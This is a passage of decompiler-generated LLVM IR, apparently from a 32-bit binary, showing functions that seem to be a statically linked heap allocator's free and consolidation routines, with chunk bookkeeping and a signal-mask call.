  %v2_80506a1 = add i32 %v0_80506a1, %v1_8050648
  %v1_80506a4 = or i32 %v2_80506a1, 1
  store i32 %v1_80506a4, i32* %eax.global-to-local, align 4
  %v1_80506a7 = load i32, i32* @ecx, align 4
  %v2_80506a7 = add i32 %v1_80506a7, 4
  %v3_80506a7 = inttoptr i32 %v2_80506a7 to i32*
  store i32 %v1_80506a4, i32* %v3_80506a7, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v0_80506ae = load i32, i32* @ecx, align 4
  store i32 %v0_80506ae, i32* %v3_80506ae, align 4
  br label %dec_label_pc_80506b1

dec_label_pc_80506b1:                             ; preds = %dec_label_pc_805067d, %dec_label_pc_80506a1
  store i32 %v3_8050603, i32* @ecx, align 4
  %v1_80506b5 = icmp eq i32 %v3_8050603, 0
  %v1_80506b7 = icmp eq i1 %v1_80506b5, false
  br i1 %v1_80506b7, label %dec_label_pc_8050603, label %dec_label_pc_80506bd

dec_label_pc_80506bd:                             ; preds = %dec_label_pc_80506b1, %dec_label_pc_80505ef
  %v15_80506c1 = icmp eq i32 %v0_80505fd, %v4_80505e7
  br i1 %v15_80506c1, label %dec_label_pc_8050745, label %dec_label_pc_80506c7

dec_label_pc_80506c7:                             ; preds = %dec_label_pc_80506bd
  br label %dec_label_pc_80505ef

dec_label_pc_80506d1:                             ; preds = %dec_label_pc_80506d1.lr.ph, %dec_label_pc_80506d1
  %v1_80506d5 = phi i32 [ 1, %dec_label_pc_80506d1.lr.ph ], [ %v0_80506e0, %dec_label_pc_80506d1 ]
  %v2_80506d5 = mul i32 %v1_80506d5, 8
  %v4_80506d5 = add i32 %v3_80506d5, %v2_80506d5
  store i32 %v4_80506d5, i32* %eax.global-to-local, align 4
  %v1_80506d9 = add i32 %v1_80506d5, 1
  store i32 %v1_80506d9, i32* %edx.global-to-local, align 4
  %v2_80506da = add i32 %v4_80506d5, 12
  %v3_80506da = inttoptr i32 %v2_80506da to i32*
  store i32 %v4_80506d5, i32* %v3_80506da, align 4
  %v0_80506dd = load i32, i32* %eax.global-to-local, align 4
  %v2_80506dd = add i32 %v0_80506dd, 8
  %v3_80506dd = inttoptr i32 %v2_80506dd to i32*
  store i32 %v0_80506dd, i32* %v3_80506dd, align 4
  %v0_80506e0 = load i32, i32* %edx.global-to-local, align 4
  %v7_80506e3 = icmp sgt i32 %v0_80506e0, 95
  br i1 %v7_80506e3, label %dec_label_pc_80506e5, label %dec_label_pc_80506d1

dec_label_pc_80506e5:                             ; preds = %dec_label_pc_80506d1
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80506e9 = add i32 %tmp20, 864
  %v2_80506e9 = inttoptr i32 %v1_80506e9 to i32*
  %v3_80506e9 = load i32, i32* %v2_80506e9, align 4
  %v4_80506e9 = or i32 %v3_80506e9, 1
  store i32 %v4_80506e9, i32* %v2_80506e9, align 4
  %v0_80506f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506f0 = add i32 %v0_80506f0, 840
  %v2_80506f0 = inttoptr i32 %v1_80506f0 to i32*
  store i32 0, i32* %v2_80506f0, align 4
  %v0_80506fa = load i32, i32* %eax.global-to-local, align 4
  %v1_80506fa = add i32 %v0_80506fa, 852
  %v2_80506fa = inttoptr i32 %v1_80506fa to i32*
  store i32 65536, i32* %v2_80506fa, align 4
  %v0_8050704 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050704 = add i32 %v0_8050704, 844
  %v2_8050704 = inttoptr i32 %v1_8050704 to i32*
  store i32 262144, i32* %v2_8050704, align 4
  %v0_805070e = load i32, i32* %eax.global-to-local, align 4
  %v1_805070e = add i32 %v0_805070e, 836
  %v2_805070e = inttoptr i32 %v1_805070e to i32*
  store i32 262144, i32* %v2_805070e, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805071f = load i32, i32* %arg1, align 4
  %v1_8050721 = urem i32 %v2_805071f, 4
  %v1_8050724 = or i32 %v1_8050721, 72
  store i32 %v1_8050724, i32* %arg1, align 4
  %v1_805072b = add i32 %tmp20, 52
  store i32 %v1_805072b, i32* %eax.global-to-local, align 4
  %v2_805072e = add i32 %tmp20, 44
  %v3_805072e = inttoptr i32 %v2_805072e to i32*
  store i32 %v1_805072b, i32* %v3_805072e, align 4
  %v1_8050733 = call i32 @function_8051158(i32 30)
  store i32 %v1_8050733, i32* %eax.global-to-local, align 4
  %v2_805073f = add i32 %tmp20, 860
  %v3_805073f = inttoptr i32 %v2_805073f to i32*
  store i32 %v1_8050733, i32* %v3_805073f, align 4
  br label %dec_label_pc_8050745

dec_label_pc_8050745:                             ; preds = %dec_label_pc_80506bd, %dec_label_pc_80506e5
  store i32 %v0_80505a8, i32* @ebx, align 4
  store i32 %v0_80505a7, i32* @esi, align 4
  store i32 %v0_80505a6, i32* @edi, align 4
  %v0_805074c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805074c

; uselistorder directives
  uselistorder i32 %v0_80506e0, { 1, 0 }
  uselistorder i32 %v0_80506dd, { 1, 0 }
  uselistorder i32 %v1_80506d5, { 1, 0 }
  uselistorder i32 %v0_8050699, { 1, 0 }
  uselistorder i32 %v1_8050657, { 1, 0 }
  uselistorder i32 %v2_8050650, { 1, 0 }
  uselistorder i32 %v1_8050648, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050654, { 1, 0 }
  uselistorder i32 %v3_8050603, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8050620, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80505fd, { 2, 0, 1, 3 }
  uselistorder i32* %v3_80506ae, { 1, 0 }
  uselistorder i32 %tmp20, { 6, 2, 1, 15, 13, 12, 10, 9, 0, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 (i32)* @function_8051158, { 1, 0 }
  uselistorder label %dec_label_pc_8050745, { 1, 0 }
  uselistorder label %dec_label_pc_80506d1, { 1, 0 }
  uselistorder label %dec_label_pc_80506b1, { 1, 0 }
  uselistorder label %dec_label_pc_805067d, { 1, 0 }
  uselistorder label %dec_label_pc_8050675, { 1, 0 }
  uselistorder label %dec_label_pc_8050640, { 1, 0 }
}

define i32 @function_805074d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805074d:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805074d = load i32, i32* @ebp, align 4
  %v0_805074f = load i32, i32* @esi, align 4
  %v0_8050750 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050758 = icmp eq i32 %arg1, 0
  br i1 %v1_8050758, label %dec_label_pc_80508e1, label %dec_label_pc_8050760

dec_label_pc_8050760:                             ; preds = %dec_label_pc_805074d
  %v2_805076b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805076b, i32* @eax, align 4
  %v2_8050770 = call i32 @function_80512e2(i32 %v2_805076b, i32 134550239)
  store i32 %v2_8050770, i32* %eax.global-to-local, align 4
  %v1_805077c = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_80557d0.55 to i32))
  %v1_8050781 = add i32 %arg1, -8
  store i32 %v1_8050781, i32* @ecx, align 4
  %v0_8050784 = load i8, i8* @global_var_805ba20.56, align 1
  %v1_8050784 = sext i8 %v0_8050784 to i32
  store i32 %v1_8050784, i32* %eax.global-to-local, align 4
  %v1_8050789 = add i32 %arg1, -4
  %v2_8050789 = inttoptr i32 %v1_8050789 to i32*
  %v3_8050789 = load i32, i32* %v2_8050789, align 4
  store i32 %v3_8050789, i32* %edx.global-to-local, align 4
  %v1_8050791 = and i32 %v3_8050789, -4
  %v4_8050791 = trunc i32 %v1_8050791 to i8
  store i32 %v1_8050791, i32* @ebx, align 4
  %v8_8050796 = icmp ugt i8 %v4_8050791, %v0_8050784
  br i1 %v8_8050796, label %dec_label_pc_80507b8, label %dec_label_pc_8050798

dec_label_pc_8050798:                             ; preds = %dec_label_pc_8050760
  %v1_8050798 = or i32 %v1_8050784, 3
  store i32 %v1_8050798, i32* %eax.global-to-local, align 4
  %v2_805079b = udiv i32 %v3_8050789, 8
  %v1_805079e = trunc i32 %v1_8050798 to i8
  store i8 %v1_805079e, i8* @global_var_805ba20.56, align 32
  %v1_80507a3 = mul nuw i32 %v2_805079b, 4
  %v2_80507a3 = add i32 %v1_80507a3, ptrtoint (i8* @global_var_805ba20.56 to i32)
  store i32 %v2_80507a3, i32* %edx.global-to-local, align 4
  %v1_80507aa = add i32 %v1_80507a3, add (i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32 -4)
  %v2_80507aa = inttoptr i32 %v1_80507aa to i32*
  %v3_80507aa = load i32, i32* %v2_80507aa, align 4
  store i32 %v3_80507aa, i32* %eax.global-to-local, align 4
  %v3_80507ad = inttoptr i32 %arg1 to i32*
  store i32 %v3_80507aa, i32* %v3_80507ad, align 4
  %v0_80507b0 = load i32, i32* @ecx, align 4
  %v1_80507b0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80507b0 = add i32 %v1_80507b0, -4
  %v3_80507b0 = inttoptr i32 %v2_80507b0 to i32*
  store i32 %v0_80507b0, i32* %v3_80507b0, align 4
  br label %dec_label_pc_80508d0

dec_label_pc_80507b8:                             ; preds = %dec_label_pc_8050760
  %v2_80507b8 = and i32 %v3_8050789, 2
  %v3_80507b8 = icmp eq i32 %v2_80507b8, 0
  %v1_80507bb = icmp eq i1 %v3_80507b8, false
  br i1 %v1_80507bb, label %dec_label_pc_80508b0, label %dec_label_pc_80507c1

dec_label_pc_80507c1:                             ; preds = %dec_label_pc_80507b8
  %v1_80507c1 = or i32 %v1_8050784, 1
  %v3_80507c1 = trunc i32 %v1_80507c1 to i8
  store i32 %v1_80507c1, i32* %eax.global-to-local, align 4
  store i8 %v3_80507c1, i8* @global_var_805ba20.56, align 32
  %v2_80507c9 = add i32 %v1_8050791, %v1_8050781
  store i32 %v2_80507c9, i32* @esi, align 4
  %v1_80507cc = add i32 %v2_80507c9, 4
  %v2_80507cc = inttoptr i32 %v1_80507cc to i32*
  %v3_80507cc = load i32, i32* %v2_80507cc, align 4
  store i32 %v3_80507cc, i32* %eax.global-to-local, align 4
  %v2_80507d3 = inttoptr i32 %v1_8050789 to i8*
  %v3_80507d3 = load i8, i8* %v2_80507d3, align 1
  %v4_80507d3 = urem i8 %v3_80507d3, 2
  %v5_80507d3 = icmp eq i8 %v4_80507d3, 0
  %v1_80507d7 = icmp eq i1 %v5_80507d3, false
  br i1 %v1_80507d7, label %dec_label_pc_80507fa, label %dec_label_pc_80507d9

dec_label_pc_80507d9:                             ; preds = %dec_label_pc_80507c1
  %v2_80507d9 = inttoptr i32 %v1_8050781 to i32*
  %v3_80507d9 = load i32, i32* %v2_80507d9, align 4
  store i32 %v3_80507d9, i32* @ebp, align 4
  %v2_80507de = sub i32 %v1_8050781, %v3_80507d9
  store i32 %v2_80507de, i32* %eax.global-to-local, align 4
  %v1_80507e0 = add i32 %v2_80507de, 8
  %v2_80507e0 = inttoptr i32 %v1_80507e0 to i32*
  %v3_80507e0 = load i32, i32* %v2_80507e0, align 4
  store i32 %v3_80507e0, i32* @edi, align 4
  %v1_80507e3 = add i32 %v2_80507de, 12
  %v2_80507e3 = inttoptr i32 %v1_80507e3 to i32*
  %v3_80507e3 = load i32, i32* %v2_80507e3, align 4
  store i32 %v3_80507e3, i32* %edx.global-to-local, align 4
  %v1_80507e6 = add i32 %v3_80507e0, 12
  %v2_80507e6 = inttoptr i32 %v1_80507e6 to i32*
  %v3_80507e6 = load i32, i32* %v2_80507e6, align 4
  store i32 %v3_80507e6, i32* @ecx, align 4
  %v12_80507e9 = icmp eq i32 %v3_80507e6, %v2_80507de
  %v1_80507eb = icmp eq i1 %v12_80507e9, false
  br i1 %v1_80507eb, label %dec_label_pc_8050829, label %dec_label_pc_80507ed

dec_label_pc_80507ed:                             ; preds = %dec_label_pc_80507d9
  %v1_80507ed = add i32 %v3_80507e3, 8
  %v2_80507ed = inttoptr i32 %v1_80507ed to i32*
  %v3_80507ed = load i32, i32* %v2_80507ed, align 4
  %v15_80507ed = icmp eq i32 %v3_80507ed, %v3_80507e6
  %v1_80507f0 = icmp eq i1 %v15_80507ed, false
  br i1 %v1_80507f0, label %dec_label_pc_8050829, label %dec_label_pc_80507f2

dec_label_pc_80507f2:                             ; preds = %dec_label_pc_80507ed
  %v2_80507f2 = add i32 %v3_80507d9, %v1_8050791
  store i32 %v2_80507f2, i32* @ebx, align 4
  store i32 %v3_80507e3, i32* %v2_80507e6, align 4
  %v0_80507f7 = load i32, i32* @edi, align 4
  %v1_80507f7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80507f7 = add i32 %v1_80507f7, 8
  %v3_80507f7 = inttoptr i32 %v2_80507f7 to i32*
  store i32 %v0_80507f7, i32* %v3_80507f7, align 4
  %v0_8050801.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80507fa

dec_label_pc_80507fa:                             ; preds = %dec_label_pc_80507c1, %dec_label_pc_80507f2
  %v1_805080d = phi i32 [ %v2_80507c9, %dec_label_pc_80507c1 ], [ %v0_8050801.pre, %dec_label_pc_80507f2 ]
  %v1_80507fe = and i32 %v3_80507cc, -4
  store i32 %v1_80507fe, i32* @ebp, align 4
  %v1_8050801 = load i32, i32* @global_var_805ba4c.57, align 4
  %v12_8050801 = icmp eq i32 %v1_805080d, %v1_8050801
  br i1 %v12_8050801, label %dec_label_pc_805085b, label %dec_label_pc_8050809

dec_label_pc_8050809:                             ; preds = %dec_label_pc_80507fa
  %v2_8050809 = add i32 %v1_805080d, 4
  %v3_8050809 = add i32 %v2_8050809, %v1_80507fe
  %v4_8050809 = inttoptr i32 %v3_8050809 to i32*
  %v5_8050809 = load i32, i32* %v4_8050809, align 4
  store i32 %v5_8050809, i32* %eax.global-to-local, align 4
  %v3_805080d = inttoptr i32 %v2_8050809 to i32*
  store i32 %v1_80507fe, i32* %v3_805080d, align 4
  %v0_8050810 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050810 = urem i32 %v0_8050810, 2
  %v2_8050810 = icmp eq i32 %v1_8050810, 0
  store i32 %v1_8050810, i32* %eax.global-to-local, align 4
  %v1_8050815 = icmp eq i1 %v2_8050810, false
  br i1 %v1_8050815, label %dec_label_pc_8050836, label %dec_label_pc_8050817

dec_label_pc_8050817:                             ; preds = %dec_label_pc_8050809
  %v0_8050817 = load i32, i32* @esi, align 4
  %v1_8050817 = add i32 %v0_8050817, 8
  %v2_8050817 = inttoptr i32 %v1_8050817 to i32*
  %v3_8050817 = load i32, i32* %v2_8050817, align 4
  store i32 %v3_8050817, i32* @edx, align 4
  %v1_805081a = add i32 %v0_8050817, 12
  %v2_805081a = inttoptr i32 %v1_805081a to i32*
  %v3_805081a = load i32, i32* %v2_805081a, align 4
  store i32 %v3_805081a, i32* %eax.global-to-local, align 4
  %v1_805081d = add i32 %v3_8050817, 12
  %v2_805081d = inttoptr i32 %v1_805081d to i32*
  %v3_805081d = load i32, i32* %v2_805081d, align 4
  store i32 %v3_805081d, i32* @edi, align 4
  %v12_8050820 = icmp eq i32 %v3_805081d, %v0_8050817
  %v1_8050822 = icmp eq i1 %v12_8050820, false
  br i1 %v1_8050822, label %dec_label_pc_8050829, label %dec_label_pc_8050824

dec_label_pc_8050824:                             ; preds = %dec_label_pc_8050817
  %v1_8050824 = add i32 %v3_805081a, 8
  %v2_8050824 = inttoptr i32 %v1_8050824 to i32*
  %v3_8050824 = load i32, i32* %v2_8050824, align 4
  %v15_8050824 = icmp eq i32 %v3_8050824, %v3_805081d
  br i1 %v15_8050824, label %dec_label_pc_805082e, label %dec_label_pc_8050829

dec_label_pc_8050829:                             ; preds = %dec_label_pc_8050824, %dec_label_pc_8050817, %dec_label_pc_80507ed, %dec_label_pc_80507d9
  %v0_8050829 = call i32 @function_805090c()
  store i32 %v0_8050829, i32* %eax.global-to-local, align 4
  %v1_805082e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805082e

dec_label_pc_805082e:                             ; preds = %dec_label_pc_8050824, %dec_label_pc_8050829
  %v1_805082e = phi i32 [ %v3_8050817, %dec_label_pc_8050824 ], [ %v1_805082e.pre, %dec_label_pc_8050829 ]
  %v0_805082e = phi i32 [ %v3_805081a, %dec_label_pc_8050824 ], [ %v0_8050829, %dec_label_pc_8050829 ]
  %v2_805082e = add i32 %v1_805082e, 12
  %v3_805082e = inttoptr i32 %v2_805082e to i32*
  store i32 %v0_805082e, i32* %v3_805082e, align 4
  %v0_8050831 = load i32, i32* @ebx, align 4
  %v1_8050831 = load i32, i32* @ebp, align 4
  %v2_8050831 = add i32 %v1_8050831, %v0_8050831
  store i32 %v2_8050831, i32* @ebx, align 4
  %v0_8050833 = load i32, i32* @edx, align 4
  %v1_8050833 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050833 = add i32 %v1_8050833, 8
  %v3_8050833 = inttoptr i32 %v2_8050833 to i32*
  store i32 %v0_8050833, i32* %v3_8050833, align 4
  br label %dec_label_pc_8050836

dec_label_pc_8050836:                             ; preds = %dec_label_pc_8050809, %dec_label_pc_805082e
  %v0_8050836 = load i32, i32* @global_var_805ba5c.75, align 4
  store i32 %v0_8050836, i32* %eax.global-to-local, align 4
  %v0_805083b = load i32, i32* @ecx, align 4
  %v1_805083b = add i32 %v0_805083b, 12
  %v2_805083b = inttoptr i32 %v1_805083b to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v2_805083b, align 4
  %v0_8050842 = load i32, i32* @ebx, align 4
  %v1_8050842 = load i32, i32* @ecx, align 4
  %v3_8050842 = add i32 %v1_8050842, %v0_8050842
  %v4_8050842 = inttoptr i32 %v3_8050842 to i32*
  store i32 %v0_8050842, i32* %v4_8050842, align 4
  %v0_8050845 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050845 = load i32, i32* @ecx, align 4
  %v2_8050845 = add i32 %v1_8050845, 8
  %v3_8050845 = inttoptr i32 %v2_8050845 to i32*
  store i32 %v0_8050845, i32* %v3_8050845, align 4
  %v0_8050848 = load i32, i32* @ecx, align 4
  %v1_8050848 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050848 = add i32 %v1_8050848, 12
  %v3_8050848 = inttoptr i32 %v2_8050848 to i32*
  store i32 %v0_8050848, i32* %v3_8050848, align 4
  %v0_805084b = load i32, i32* @ebx, align 4
  %v1_805084d = or i32 %v0_805084b, 1
  store i32 %v1_805084d, i32* %eax.global-to-local, align 4
  %v0_8050850 = load i32, i32* @ecx, align 4
  store i32 %v0_8050850, i32* @global_var_805ba5c.75, align 4
  %v2_8050856 = add i32 %v0_8050850, 4
  %v3_8050856 = inttoptr i32 %v2_8050856 to i32*
  store i32 %v1_805084d, i32* %v3_8050856, align 4
  br label %dec_label_pc_805086b

dec_label_pc_805085b:                             ; preds = %dec_label_pc_80507fa
  %v0_805085b = load i32, i32* @ebx, align 4
  %v2_805085b = add i32 %v0_805085b, %v1_80507fe
  store i32 %v2_805085b, i32* @ebx, align 4
  %v1_805085f = or i32 %v2_805085b, 1
  store i32 %v1_805085f, i32* %eax.global-to-local, align 4
  %v1_8050862 = load i32, i32* @ecx, align 4
  %v2_8050862 = add i32 %v1_8050862, 4
  %v3_8050862 = inttoptr i32 %v2_8050862 to i32*
  store i32 %v1_805085f, i32* %v3_8050862, align 4
  %v0_8050865 = load i32, i32* @ecx, align 4
  store i32 %v0_8050865, i32* @global_var_805ba4c.57, align 4
  br label %dec_label_pc_805086b

dec_label_pc_805086b:                             ; preds = %dec_label_pc_8050836, %dec_label_pc_805085b
  %v0_805086b = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_805086b, 131072
  br i1 %tmp21, label %dec_label_pc_80508d0, label %dec_label_pc_8050873

dec_label_pc_8050873:                             ; preds = %dec_label_pc_805086b
  %v0_8050873 = load i8, i8* @global_var_805ba20.56, align 32
  %v1_8050873 = and i8 %v0_8050873, 2
  %v2_8050873 = icmp eq i8 %v1_8050873, 0
  br i1 %v2_8050873, label %dec_label_pc_805088c, label %dec_label_pc_805087c

dec_label_pc_805087c:                             ; preds = %dec_label_pc_8050873
  %v2_8050884 = call i32 @function_80505a5(i32* bitcast (i8* @global_var_805ba20.56 to i32*))
  store i32 %v2_8050884, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805088c

dec_label_pc_805088c:                             ; preds = %dec_label_pc_8050873, %dec_label_pc_805087c
  %v0_805088c = load i32, i32* @global_var_805ba4c.57, align 4
  store i32 %v0_805088c, i32* %eax.global-to-local, align 4
  %v1_8050891 = add i32 %v0_805088c, 4
  %v2_8050891 = inttoptr i32 %v1_8050891 to i32*
  %v3_8050891 = load i32, i32* %v2_8050891, align 4
  %v1_8050894 = and i32 %v3_8050891, -4
  store i32 %v1_8050894, i32* %eax.global-to-local, align 4
  %v1_8050897 = load i32, i32* @global_var_805bd64.73, align 4
  %v7_8050897 = icmp ult i32 %v1_8050894, %v1_8050897
  br i1 %v7_8050897, label %dec_label_pc_80508d0, label %dec_label_pc_805089f

dec_label_pc_805089f:                             ; preds = %dec_label_pc_805088c
  %v0_805089f = load i32, i32* @global_var_805bd68.71, align 8
  store i32 %v0_805089f, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32* @edx, align 4
  %v0_80508a9 = call i32 @function_8050518()
  store i32 %v0_80508a9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508d0

dec_label_pc_80508b0:                             ; preds = %dec_label_pc_80507b8
  %v2_80508b0 = inttoptr i32 %v1_8050781 to i32*
  %v3_80508b0 = load i32, i32* %v2_80508b0, align 4
  store i32 %v3_80508b0, i32* %edx.global-to-local, align 4
  %v0_80508b3 = load i32, i32* @global_var_805bd70.64, align 16
  %v1_80508b3 = add i32 %v0_80508b3, -1
  store i32 %v1_80508b3, i32* @global_var_805bd70.64, align 16
  %v2_80508b9 = add i32 %v3_80508b0, %v1_8050791
  store i32 %v2_80508b9, i32* %eax.global-to-local, align 4
  %v2_80508bc = sub i32 %v1_8050781, %v3_80508b0
  %v0_80508c2 = load i32, i32* @global_var_805bd84.68, align 4
  %v2_80508c2 = sub i32 %v0_80508c2, %v2_80508b9
  store i32 %v2_80508c2, i32* @global_var_805bd84.68, align 4
  %v4_80508c8 = inttoptr i32 %v2_80508bc to i32*
  %v5_80508c8 = call i32 @function_80517c4(i32* %v4_80508c8, i32 %v2_80508b9, i32 %v1_8050791, i32 %v1_8050791)
  store i32 %v5_80508c8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508d0

dec_label_pc_80508d0:                             ; preds = %dec_label_pc_805088c, %dec_label_pc_805086b, %dec_label_pc_805089f, %dec_label_pc_8050798, %dec_label_pc_80508b0
  store i32 %v2_805076b, i32* @eax, align 4
  %v2_80508d9 = call i32 @function_80512e2(i32 %v2_805076b, i32 1)
  store i32 %v2_80508d9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508e1

dec_label_pc_80508e1:                             ; preds = %dec_label_pc_805074d, %dec_label_pc_80508d0
  %.0 = phi i32 [ undef, %dec_label_pc_805074d ], [ %v2_80508d9, %dec_label_pc_80508d0 ]
  store i32 %v0_8050750, i32* @ebx, align 4
  store i32 %v0_805074f, i32* @esi, align 4
  store i32 %v0_805074d, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80508b0, { 1, 0, 2 }
  uselistorder i32 %v0_8050842, { 1, 0 }
  uselistorder i32 %v1_8050810, { 1, 0 }
  uselistorder i32 %v2_8050809, { 1, 0 }
  uselistorder i32 %v1_80507fe, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805080d, { 1, 0 }
  uselistorder i32 %v1_8050791, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050789, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050781, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_805ba20.56 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805ba54.59 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805ba4c.57, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_80508e1, { 1, 0 }
  uselistorder label %dec_label_pc_80508d0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805088c, { 1, 0 }
  uselistorder label %dec_label_pc_805086b, { 1, 0 }
  uselistorder label %dec_label_pc_8050836, { 1, 0 }
  uselistorder label %dec_label_pc_805082e, { 1, 0 }
  uselistorder label %dec_label_pc_80507fa, { 1, 0 }
}

define i32 @function_80508e9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80508e9:
  %v0_80508e9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80508f6 = call i32 @function_80505a5(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805ba20.56 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32* @edx, align 4
  %v0_8050903 = load i32, i32* @ebx, align 4
  store i32 %v0_8050903, i32* @eax, align 4
  store i32 %v0_80508e9, i32* @ebx, align 4
  %v0_8050906 = call i32 @function_8050518()
  ret i32 %v0_8050906

; uselistorder directives
  uselistorder i32 ()* @function_8050518, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805ba20.56 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805ba20.56, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_805090c() local_unnamed_addr {
dec_label_pc_8050927.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8050918 = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_80557e8.76 to i32))
  %v12_8050922 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805092747 = add i32 %v12_8050922, 276
  %v5_805092748 = inttoptr i32 %v4_805092747 to i32*
  store i32 0, i32* %v5_805092748, align 4
  %v0_805093249 = load i32, i32* %eax.global-to-local, align 4
  %v1_805093250 = add i32 %v0_805093249, -1
  %v9_805093251 = icmp slt i32 %v1_805093250, 0
  store i32 %v1_805093250, i32* %eax.global-to-local, align 4
  %v1_805093352 = icmp eq i1 %v9_805093251, false
  br i1 %v1_805093352, label %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge, label %dec_label_pc_8050935

dec_label_pc_8050927.dec_label_pc_8050927_crit_edge: ; preds = %dec_label_pc_8050927.lr.ph, %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge
  %v1_805093253 = phi i32 [ %v1_8050932, %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge ], [ %v1_805093250, %dec_label_pc_8050927.lr.ph ]
  %v0_8050927.pre = load i32, i32* @esp, align 4
  %v2_8050927 = mul i32 %v1_805093253, 4
  %v3_8050927 = add i32 %v0_8050927.pre, 152
  %v4_8050927 = add i32 %v3_8050927, %v2_8050927
  %v5_8050927 = inttoptr i32 %v4_8050927 to i32*
  store i32 0, i32* %v5_8050927, align 4
  %v0_8050932 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050932 = add i32 %v0_8050932, -1
  %v9_8050932 = icmp slt i32 %v1_8050932, 0
  store i32 %v1_8050932, i32* %eax.global-to-local, align 4
  %v1_8050933 = icmp eq i1 %v9_8050932, false
  br i1 %v1_8050933, label %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge, label %dec_label_pc_8050935

dec_label_pc_8050935:                             ; preds = %dec_label_pc_8050927.dec_label_pc_8050927_crit_edge, %dec_label_pc_8050927.lr.ph
  %v0_8050935 = load i32, i32* @ebx, align 4
  %v2_8050939 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050939, i32* @ebx, align 4
  %v4_8050941 = call i32 @function_804fd10(i32 %v2_8050939, i32 6, i32 %v0_8050935, i32 %v0_8050935)
  store i32 %v4_8050941, i32* %eax.global-to-local, align 4
  %v1_8050949 = icmp eq i32 %v4_8050941, 0
  %v1_805094b = icmp eq i1 %v1_8050949, false
  br i1 %v1_805094b, label %dec_label_pc_805095b, label %dec_label_pc_805094d

dec_label_pc_805094d:                             ; preds = %dec_label_pc_8050935
  %v3_8050953 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8050953 = call i32 @function_804e584(i32 1, %_TYPEDEF_sigset_t* %v3_8050953, i32 0)
  store i32 %v4_8050953, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805095b

dec_label_pc_805095b:                             ; preds = %dec_label_pc_8050935, %dec_label_pc_805094d
  %v2_805099323 = phi i32 [ %v4_8050941, %dec_label_pc_8050935 ], [ %v4_8050953, %dec_label_pc_805094d ]
  %v0_805095b = load i8, i8* @global_var_805b954.77, align 4
  %v1_805095b = icmp eq i8 %v0_805095b, 0
  %v1_8050962 = icmp eq i1 %v1_805095b, false
